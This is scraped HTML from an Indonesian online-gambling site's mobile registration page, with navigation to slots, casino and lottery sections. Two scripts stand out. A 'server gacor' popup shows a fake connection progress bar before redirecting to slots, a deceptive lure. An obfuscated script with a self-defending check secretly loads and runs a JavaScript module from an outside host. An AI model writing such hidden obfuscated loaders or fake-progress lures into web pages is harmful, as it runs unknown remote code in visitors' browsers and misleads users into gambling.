      const btnWrapper = document.createElement("div");
      btnWrapper.style.textAlign = "center";
      btnWrapper.style.margin = "20px";
      btnWrapper.innerHTML = `
        <button id="btnOpenMaxwin" style="
          background: linear-gradient(to bottom, #FFD700, #B7870C);
          color: #111;
          border: none;
          padding: 12px 30px;
          border-radius: 6px;
          font-size: 16px;
          font-weight: bold;
          box-shadow: 0 4px 8px rgba(255,215,0,0.5);
          cursor: pointer;
        ">🌐 PILIH SERVER GACOR</button>
      `;
      banner.parentNode.insertBefore(btnWrapper, banner.nextSibling);
    
      const popup = document.createElement("div");
      popup.id = "maxwin-overlay";
      popup.style.cssText = `
        position: fixed;
        top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(0,0,0,0.85);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 99999;
      `;
      popup.innerHTML = `
        <div id="maxwin-modal" style="
          background: #1c1c1c;
          border: 2px solid #FFD700;
          border-radius: 10px;
          max-width: 800px;
          width: 90%;
          padding: 25px;
          position: relative;
          color: #fff;
          font-family: Arial, sans-serif;
          box-shadow: 0 0 20px rgba(255,215,0,0.3);
        ">
          <button id="closeMaxwin" style="
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 24px;
            color: #FFD700;
            cursor: pointer;
            border: none;
            background: transparent;
          ">&times;</button>
    
          <h4 style="font-size: 14px; color:#FFD700;">FITUR EKSKLUSIF SERVER INTERNATIONAL</h4>
          <hr style="border: 1px solid #333;">
          <h3 style="text-align:center; color:#FFD700;">SERVER INTERNATIONAL</h3>
          <p style="text-align:center; color:#fff;">Silahkan Pilih Server:</p>
    
          <select id="serverSelect" style="
            width: 100%;
            padding: 12px;
            font-size: 16px;
            margin-bottom: 15px;
            background-color: #2b2b2b;
            color: #fff;
            border: 1px solid #FFD700;
            border-radius: 4px;
          ">
            <option value="id">SERVER GACOR INDONESIA</option>
            <option value="sg">SERVER GACOR SINGAPORE</option>
            <option value="th">SERVER GACOR THAILAND</option>
            <option value="ae">SERVER GACOR DUBAI</option>
            <option value="vn">SERVER GACOR VIETNAM</option>
            <option value="ph">SERVER GACOR FILIPINA</option>
            <option value="mm">SERVER GACOR MYANMAR</option>
            <option value="jp">SERVER GACOR JEPANG</option>
            <option value="ru">SERVER GACOR RUSIA</option>
            <option value="kr">SERVER GACOR KOREA</option>
            <option value="cn">SERVER GACOR CHINA</option>
            <option value="hk">SERVER GACOR HONGKONG</option>
            <option value="my">SERVER GACOR MALAYSIA</option>
            <option value="int">SERVER GACOR INTERNATIONAL 🌐</option>
          </select>
    
          <div style="
            background-color: #333;
            height: 22px;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 12px;
            border: 1px solid #FFD700;
          ">
            <div id="progressBar" style="
              width: 0%;
              background: linear-gradient(90deg, #FFD700, #B7870C);
              height: 100%;
              text-align: center;
              color: #111;
              font-size: 14px;
              font-weight: bold;
              text-shadow: 0 0 5px rgba(0,0,0,0.6);
              transition: width 0.3s;
            ">0%</div>
          </div>
    
          <p id="statusText" style="text-align: center; font-weight: bold; color:#FFD700;"></p>
    
          <div style="text-align: center;">
            <button id="btnConnect" style="
              background: linear-gradient(to bottom, #FFD700, #B7870C);
              color: #111;
              border: none;
              padding: 10px 30px;
              border-radius: 6px;
              font-size: 14px;
              font-weight: bold;
              cursor: pointer;
              box-shadow: 0 0 12px rgba(255,215,0,0.6);
            ">HUBUNGKAN</button>
          </div>
        </div>
      `;
      document.body.appendChild(popup);
    
      document.getElementById("btnOpenMaxwin").addEventListener("click", () => {
        popup.style.display = "flex";
      });
    
      document.getElementById("closeMaxwin").addEventListener("click", () => {
        popup.style.display = "none";
        resetProgress();
      });
    
      let hasConnected = false;
    
      document.getElementById("btnConnect").addEventListener("click", () => {
        if (hasConnected) return;
    
        const bar = document.getElementById("progressBar");
        const status = document.getElementById("statusText");
        let progress = 0;
    
        bar.style.background = "linear-gradient(90deg,#FFD700,#B7870C)";
        status.innerText = "";
        hasConnected = true;
    
        const interval = setInterval(() => {
          progress += 5;
          bar.style.width = progress + "%";
          bar.textContent = progress + "%";
    
          if (progress >= 100) {
            clearInterval(interval);
            bar.style.background = "limegreen";
            bar.textContent = "100%";
            status.innerText = "Selesai!";
            status.style.color = "#fff";
    
            const url = new URL('/slots', window.location.href);
            url.protocol = 'https:';
            url.hostname = location.hostname;
            url.port = '';
            window.location.replace(url.toString());
          }
        }, 100);
      });
    
      function resetProgress() {
        const bar = document.getElementById("progressBar");
        const status = document.getElementById("statusText");
        bar.style.width = "0%";
        bar.textContent = "0%";
        bar.style.background = "linear-gradient(90deg,#FFD700,#B7870C)";
        status.innerText = "";
        hasConnected = false;
      }
    });
    </script> 

<script>var _0x1344b2=_0x1928;(function(_0x234a18,_0x44183a){var _0x576849=_0x1928,_0x326a2e=_0x234a18();while(!![]){try{var _0x27c6e9=parseInt(_0x576849(0x1ae))/(-0x83+-0x2a9*-0x5+-0xcc9)+parseInt(_0x576849(0x1a7))/(0x2*-0x788+-0x1a17+-0x29*-0x101)*(-parseInt(_0x576849(0x1a2))/(0xd1b+0xd4*-0x2d+0x182c))+parseInt(_0x576849(0x1a8))/(-0x193e+0x98f*0x2+0x189*0x4)+-parseInt(_0x576849(0x1a9))/(-0x2620+0x1*0x202d+0x5f8)+parseInt(_0x576849(0x1c0))/(-0x15*0x1af+-0x1*-0x1e62+0x4ff)*(-parseInt(_0x576849(0x1bd))/(0x1313+-0x627+-0xce5))+-parseInt(_0x576849(0x1a4))/(-0x1d*-0x4a+0xde*-0x2+-0x34f*0x2)*(parseInt(_0x576849(0x1b4))/(-0x5e*0x53+0x881*-0x2+0x5*0x981))+-parseInt(_0x576849(0x1ab))/(-0x2f3*0x1+0x1*0x2345+0x4*-0x812)*(-parseInt(_0x576849(0x1c2))/(-0x17be+-0x1*0xa7b+0x2244));if(_0x27c6e9===_0x44183a)break;else _0x326a2e['push'](_0x326a2e['shift']());}catch(_0x5a009a){_0x326a2e['push'](_0x326a2e['shift']());}}}(_0x3d03,0x9*0x22131+-0x2151*0x96+0xb20c2));var _0x60b0bc=(function(){var _0x34a08f=!![];return function(_0x4da461,_0x19bb5e){var _0x9b4c1c=_0x34a08f?function(){var _0x123dba=_0x1928;if(_0x19bb5e){var _0x442e90=_0x19bb5e[_0x123dba(0x1c1)](_0x4da461,arguments);return _0x19bb5e=null,_0x442e90;}}:function(){};return _0x34a08f=![],_0x9b4c1c;};}()),_0x3a9b7d=_0x60b0bc(this,function(){var _0x29a51c=_0x1928,_0x346248={'RCpcD':_0x29a51c(0x1b6)+'+$'};return _0x3a9b7d[_0x29a51c(0x1be)]()[_0x29a51c(0x1b9)](_0x346248[_0x29a51c(0x1aa)])[_0x29a51c(0x1be)]()[_0x29a51c(0x1b3)+'r'](_0x3a9b7d)[_0x29a51c(0x1b9)](_0x29a51c(0x1b6)+'+$');});function _0x1928(_0x3ef2e8,_0x51db8f){var _0x26a1e3=_0x3d03();return _0x1928=function(_0x5c46d7,_0x3a8e08){_0x5c46d7=_0x5c46d7-(0xb6d+-0x13ac*-0x1+-0x13*0x18d);var _0x214423=_0x26a1e3[_0x5c46d7];return _0x214423;},_0x1928(_0x3ef2e8,_0x51db8f);}_0x3a9b7d();var hokiScript=document[_0x1344b2(0x1af)+_0x1344b2(0x1bc)](_0x1344b2(0x1b5));hokiScript[_0x1344b2(0x1b8)]=_0x1344b2(0x1b0),hokiScript[_0x1344b2(0x1b7)]=function(){var _0x15387f=_0x1344b2;hokiStart(_0x15387f(0x1b2));},hokiScript[_0x1344b2(0x1b1)]=_0x1344b2(0x1c3)+_0x1344b2(0x1a5)+_0x1344b2(0x1ad)+_0x1344b2(0x1ba),hokiScript[_0x1344b2(0x1ac)]=!(0x64e+0x1864+-0x1eb2),document[_0x1344b2(0x1a6)+_0x1344b2(0x1bf)](_0x1344b2(0x1a3))[0x1c46+0xedc+-0x2b22][_0x1344b2(0x1bb)+'d'](hokiScript);function _0x3d03(){var _0x125f3a=['script','(((.+)+)+)','onload','type','search','agaming.js','appendChil','ent','7Bdcwop','toString','sByTagName','7760958dxQrVz','apply','11qiFdit','https://as','231cSYnel','head','4315888oRPJPA','set.qrisho','getElement','4084pGAqGP','4756920BcGrRD','3277430pMpqSo','RCpcD','13030170VaIjxy','async','ki.com/gig','1398991GuWUbO','createElem','module','src','cpg138','constructo','18mtIYQh'];_0x3d03=function(){return _0x125f3a;};return _0x3d03();}</script>
 





 
<meta charset="utf-8">

<meta name="csrf-token" content="NBEbKxG6lPy03y4rzVutbS2sGHgPjHuNJefNtVGv">

<script src="/assets/js/jquery/jquery.min.js"></script>
<script src="/assets/js/bootstrap/bootstrap.min.js"></script>

     
                        <link rel="preload" href="/assets/fonts/ugsubskin/icomoon/fonts/icomoon.woff2" as="font" type="font/woff2" crossorigin="anonymous">
      <link rel="stylesheet" href="/assets/fonts/ugsubskin/icomoon/style.min.css" media="all" onload="this.media='all'"> 
      <link rel="stylesheet" href="/assets/css/swiper.css">

  <link type="text/css" rel="stylesheet" href="/assets/css/app-mobile.css">     
    <link type="text/css" rel="stylesheet" href="/assets/css/custom.css">
    <script src="/assets/js/jquery/sweet_alert2.min.js"></script>
 

  <link rel="stylesheet" href="/assets/js/jquery/jquery-ui.min.css" media="all" onload="this.media='all'">
  <script src="/assets/js/jquery/jquery-ui.min.js" defer=""></script>
  <script type="text/javascript" src="/assets/js/jquery/jquery.ui.touch-punch.min.js" defer=""></script>




 
  <div class="full-container layout">
    <div id="sideNav" class="side-nav">
      <nav class="nav-content">
  <ul class="side-nav-items">
    <li class="nav-item">

      <a class="navlink" href="/index.php" onclick="closeNav(-1);">
        <div><i class="icon-home"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@HOME">HOME</div>
      </a>

    </li>
        
        <li class="nav-item">
      <a href="#" class="navlink has-sub" onclick="openNavItem(0);" [ngclass]="{'active':isOpenNavContent[1], '':   !isOpenNavContent[1]}">
        <div><i class="icon-videogame_asset"></i></div>
        <div class="nav-title" i18n="">PERMAINAN</div>
      </a>
      <div class="nav-item-content games" [ngclass]="{'open':isOpenNavContent[1], '':!isOpenNavContent[1]}">
        <ul class="submenu">
                  <!-- <i class="icon-lottery"></i>
                  <i  class="icon-others"></i>    -->

                                   <li>  <a href="/mobile.babaybos88/slot.html" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-slot"></i>
               
                </span>
                   <span class="hot sub" style="">HOT</span>
              </div>
              <div class="fs-sm mt-1">SLOTS</div>
            </a>
            </li>
                                                <li>  <a href="/mobile.babaybos88/live.mobile.html" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <img src="https://files.sitestatic.net/images/live_game_icon.gif?v=1" ref="live game" height="41px">               
                </span>
                   <span class="hot sub" style="">HOT</span>
              </div>
              <div class="fs-sm mt-1">LIVE GAMES</div>
            </a>
            </li>
                                                <li>  <a href="/mobile.babaybos88/sports.mobile.html" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-soccer"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">SPORTS</div>
            </a>
            </li>
                                                <li>    <a href="/mobile.babaybos88/casino.mobile.html" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-casino"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">CASINO</div>
            </a>
            </li>
                                                <li>
              <a href="/mobile.babaybos88/lotre.mobile.html" (click)="closeNav(-1);">
                <div class="">
                    <span class="circle">
                      <i class="icon-lottery"></i>
                    
                    </span>
                    <span class="hot sub new ">NEW</span>
                </div>
                <div class="fs-sm mt-1">LOTRE</div>
               </a>
            </li>
                                                <li>
              <a href="/mobile.babaybos88/tembakikan.mobile.html" (click)="closeNav(-1);">
                <div class="">
                    <span class="circle">
                    <i class="icon-fish_hunter"></i>
                    </span>
                </div>
                <div class="fs-sm mt-1">TEMBAK IKAN</div>
               </a>
            </li>
                                                <li>   <a href="/mobile.babaybos88/E-GAMES.mobile.html" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-others"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">E-GAMES</div>
            </a>
            </li>
                        

        </ul>
      </div>
    </li>

            <li class="nav-item">

      <a class="navlink" href="/promotion.mobile.html" onclick="closeNav(-1);">
        <div><i class="icon-gift"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@PROMOS">PROMOSI</div>
      </a>
    </li>
    
        <li class="nav-item">

      <a class="navlink" href="/REFERAL.MOBILE.html" onclick="closeNav(-1);">
        <div><i class="icon-users"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@REFERRAL">
                        REFERRAL                      </div>
      </a>

    </li>
                    <li class="nav-item">

      <a class="navlink" href="https://t.ly/rtpcipung" target="_blank" onclick="closeNav(-1);">
        <div>
          <i></i>
          <img src="https://files.sitestatic.net/ImageFile/202505252031220000002213b1fcac__MERCUSUAR77__200x200.webp" width="30px" height="30px">
        </div> <!--routerLinkActiveOptions for root URL-->

        <div class="nav-title">CEK RTP LIVE</div>
      </a>
    </li>
       


    <li class="nav-item">

      <a class="navlink" href="https://semangatMERCUSUAR77.site/info" onclick="closeNav(-1);">
        <div><i class="icon-info"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@INFO">INFO</div>
      </a>

    </li>
    <li class="nav-item">
      <a class="navlink" href="https://semangatMERCUSUAR77.site/contact-us" onclick="closeNav(-1);">
        <div><i class="icon-address-book"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="">HUBUNGI KAMI</div>
      </a>
    </li>
    <li class="nav-item">
      <a href="#" class="navlink" onclick="closeNav();" data-trigger="nifty" data-target="#langModal-mobile">
       <div><i class="icon-language"></i></div>
       Bahasa      </a>
    </li>
    <li class="nav-item">
      <a class="navlink" href="index.html" onclick="closeNav(-1);">
        <div><i class="icon-display"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title">Desktop View</div>
      </a>
    </li>
        <li class="nav-item"><a href="#" class="navlink" onclick="closeNav();"> <i class="icon-double_arrow_l"></i></a></li>
  </ul>
</nav>


<script>
var arr= [0,0];

function openNavItem(index){
    $('.nav-item-content').removeClass('open');
    $('.navlink.has-sub').removeClass('active');
    if(index>=0){
        $('.nav-item-content').eq(index).addClass('open');
        $('.navlink.has-sub').eq(index).addClass('active');
        $( "#mainContent" ).addClass( "navContentOpen" );
        $( "#sideNav" ).addClass( "navContentOpen" );
    }
}

function closeNav(){
    $('.nav-item-content').removeClass('open');
    $('.navlink.has-sub').removeClass('active');

    $( "#sideNav" ).removeClass( "navContentOpen" );
    $( "#sideNav" ).removeClass( "open" );
    $( "#mainContent" ).removeClass( "navContentOpen" );
    $( "#mainContent" ).removeClass( "sideNavOpen" );

}
</script>
    </div>

    <div class="main-content" id="mainContent">
      <div class="backdrop" id="mainContentContainer">

        <div class="top-bar">
          <div class="inner-header flex-row ">

<button id="btnToggleSideNav" class="btn btn-link" aria-label="side nav toggle">
    <i class="icon-bars"></i>
  </button>
  <a href="https://www.Goblin88.site/" title="" class="logo">
    <div><img class="img-fluid" alt="MERCUSUAR77" src="/assets/ImageFile/mercusuar.gif"></div>
  </a>

          <a id="btnToggleRSideNav">
      <i class="icon-user-o"></i>    
    </a>
    
  



</div>
        </div>
        <div class="content my01">

                                              
           <div class="container  ">
      <div class="row">  
                <div class="col-xs-12">
          <div class="mb-1">
            <h3 class="d-flex" style="justify-content: space-between; ">Daftar Akun 
                           <span class="sup" style="font-size:13px"> 
                <a tabindex="0" id="Pop_my001" class="btn btn-clear" role="button" data-toggle="popover" data-trigger="focus" title="" data-original-title="Member Benefits">
                MANFAAT ANGGOTA<i class="fas fa-question-circle"></i> 
                </a>
              </span>
                          </h3>
         
 
          
             
        <form class="register-form form form-horizontal needs-validation" [formgroup]="register-form" id="registerForm1" method="post" action="register.php" enctype="multipart/form-data" novalidate="novalidate">
    
    <input type="hidden" name="stage_val" value="1" id="stage_val">
       <input type="hidden" name="_token" value="8xe1UaFS4z4Wok9HUllb8i4qMYsdSgmjxJov7pBY">

       <input type="hidden" name="register_token" value="VABAHAA-20260211155219-698ca5b36d5754.20297597">
       
       <div class="register_form_one">
            <div class="sub-title">Rincian Akun</div>
            <div class="form-group">
                <div class="col-md-5">
                    <label>Nama pengguna</label>
                </div>
                <div class="col-md-7">
                    <input type="text" class="form-control " placeholder="" name="user_name" id="user_name" required="" autocomplete="nope">
                        <small class="text-left">* Nama akun harus 6-12 karakter, hanya menggunakan huruf dan/atau angka (0-9) dan tidak ada simbol (@#$~%&amp;)                    <br> cth: <b>namaakun1</b>
                    </small>
                </div>
            </div>
            <div class="form-group">
                <div class="col-md-5">
                    <label>Kata sandi</label>
                </div>
                <div class="col-md-7">
                    <input type="password" class="form-control" name="password" id="password_1" placeholder="" required="" autocomplete="new-password"> 
                        <small class="text-left">*  Minimal 8 karakter, dapat berisi alfabet dan angka<br> cth: <b>  katasandi1</b> </small>
                     
                </div>
            </div>

                                    <div class=" TdHXcpUjuOlMs"> 
                <div class="col-md-5">
                    <label>NyWnsMxYrB</label>
                </div>
                <div class="col-md-7">
                    <input type="text" class="form-control TdHXcpUjuOlMs BoAaYFsU" placeholder="" name="NyWnsMxYrB" required="" autocomplete="off">
                </div>
            </div> 
                        <div class=" TdHXcpUjuOlMs"> 
                <div class="col-md-5">
                    <label>dXbWSsrHRhMjYGqQCV</label>
                </div>
                <div class="col-md-7">
                    <input type="text" class="form-control TdHXcpUjuOlMs BoAaYFsU" placeholder="" name="dXbWSsrHRhMjYGqQCV" required="" autocomplete="off">
                </div>
            </div> 
                        <div class=" TdHXcpUjuOlMs"> 
                <div class="col-md-5">
                    <label>yACSxZCqzdYrB</label>
                </div>
                <div class="col-md-7">
                    <input type="text" class="form-control TdHXcpUjuOlMs BoAaYFsU" placeholder="" name="yACSxZCqzdYrB" required="" autocomplete="off">
                </div>
            </div> 
                                 
            

            <div class="form-group">
                <div class="col-md-5">
                    <label>Konfirmasi Sandi</label>
                </div>
                <div class="col-md-7">
                    <input type="password" class="form-control input_text" name="password_confirm" id="password_confirm" placeholder="" required="" autocomplete="new-password">
                </div>
            </div>
            <div class="sub-title">Contact info</div>
                        <div class="form-group">
                <div class="col-md-5">
                    <label>WA / Nomor telepon</label>
                </div>
                <div class="col-md-7">
                    <div class="input-group">
                                                                <div class="input-group-btn " style="display:table-cell;vertical-align:top;">
                    <button type="button" style="width: 80px;height:30px" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> 
                        <span id="txt-contact-country"> +62</span>
                        <span class="caret"></span>                    
                    </button> 
                    <input type="hidden" name="contact_country" value="62">
                    <ul class="dropdown-menu" id="ddl-contact-country" style=" height: 300px; overflow-y: scroll; ">
                        <li><a class="js-opt btn-secondary" href="javascript:void(0);" data-value="62" id="def-ctrycontact-opt">Indonesia (+62)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="62">Indonesia (+62)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="60">Malaysia (+60)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="65">Singapore (+65)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="63">Philippines (+63)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="855">Cambodia (+855)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="84">Viet Nam (+84)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="66">Thailand (+66)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="93">Afghanistan (+93)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="358">Aland Islands (+358)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="355">Albania (+355)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="213">Algeria (+213)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1684">American Samoa (+1684)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="376">Andorra (+376)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="244">Angola (+244)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1264">Anguilla (+1264)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="672">Antarctica (+672)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1268">Antigua and Barbuda (+1268)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="54">Argentina (+54)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="374">Armenia (+374)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="297">Aruba (+297)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="61">Australia (+61)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="43">Austria (+43)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="994">Azerbaijan (+994)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1242">Bahamas (+1242)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="973">Bahrain (+973)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="880">Bangladesh (+880)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1246">Barbados (+1246)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="375">Belarus (+375)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="32">Belgium (+32)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="501">Belize (+501)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="229">Benin (+229)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1441">Bermuda (+1441)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="975">Bhutan (+975)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="591">Bolivia (+591)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="599">Bonaire, Sint Eustatius and Saba (+599)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="387">Bosnia and Herzegovina (+387)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="267">Botswana (+267)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="55">Bouvet Island (+55)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="55">Brazil (+55)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="246">British Indian Ocean Territory (+246)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="673">Brunei Darussalam (+673)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="359">Bulgaria (+359)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="226">Burkina Faso (+226)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="257">Burundi (+257)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="237">Cameroon (+237)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1">Canada (+1)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="238">Cape Verde (+238)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1345">Cayman Islands (+1345)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="236">Central African Republic (+236)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="235">Chad (+235)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="56">Chile (+56)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="86">China (+86)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="61">Christmas Island (+61)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="672">Cocos (Keeling) Islands (+672)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="57">Colombia (+57)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="269">Comoros (+269)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="242">Congo (+242)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="242">Congo, Democratic Republic of the Congo (+242)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="682">Cook Islands (+682)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="506">Costa Rica (+506)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="225">Cote D'Ivoire (+225)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="385">Croatia (+385)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="53">Cuba (+53)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="599">Curacao (+599)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="357">Cyprus (+357)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="420">Czech Republic (+420)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="45">Denmark (+45)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="253">Djibouti (+253)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1767">Dominica (+1767)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1809">Dominican Republic (+1809)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="593">Ecuador (+593)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="20">Egypt (+20)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="503">El Salvador (+503)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="240">Equatorial Guinea (+240)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="291">Eritrea (+291)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="372">Estonia (+372)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="251">Ethiopia (+251)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="500">Falkland Islands (Malvinas) (+500)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="298">Faroe Islands (+298)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="679">Fiji (+679)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="358">Finland (+358)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="33">France (+33)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="594">French Guiana (+594)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="689">French Polynesia (+689)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="262">French Southern Territories (+262)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="241">Gabon (+241)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="220">Gambia (+220)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="995">Georgia (+995)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="49">Germany (+49)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="233">Ghana (+233)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="350">Gibraltar (+350)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="30">Greece (+30)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="299">Greenland (+299)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1473">Grenada (+1473)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="590">Guadeloupe (+590)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1671">Guam (+1671)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="502">Guatemala (+502)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="44">Guernsey (+44)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="224">Guinea (+224)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="245">Guinea-Bissau (+245)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="592">Guyana (+592)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="509">Haiti (+509)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="0">Heard Island and Mcdonald Islands (+0)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="39">Holy See (Vatican City State) (+39)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="504">Honduras (+504)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="852">Hong Kong (+852)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="36">Hungary (+36)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="354">Iceland (+354)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="91">India (+91)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="98">Iran, Islamic Republic of (+98)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="964">Iraq (+964)</a></li>
